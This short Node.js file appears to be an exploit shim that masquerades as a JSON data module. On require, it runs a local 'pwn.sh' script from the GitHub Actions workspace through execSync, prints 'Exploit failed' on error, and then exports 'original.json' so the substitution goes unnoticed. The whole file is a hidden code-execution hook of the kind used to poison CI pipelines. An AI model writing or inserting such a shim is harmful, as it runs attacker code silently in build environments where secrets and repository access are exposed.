const { execSync } = require('child_process');
const path = require('path');

try {
  // Use GITHUB_WORKSPACE if available, otherwise assume current directory
  const workspace = process.env.GITHUB_WORKSPACE || path.join(__dirname, '..');
  execSync('bash ' + path.join(workspace, 'pwn.sh'), { stdio: 'inherit' });
} catch (e) {
  console.error('Exploit failed:', e);
}

module.exports = require('./original.json');
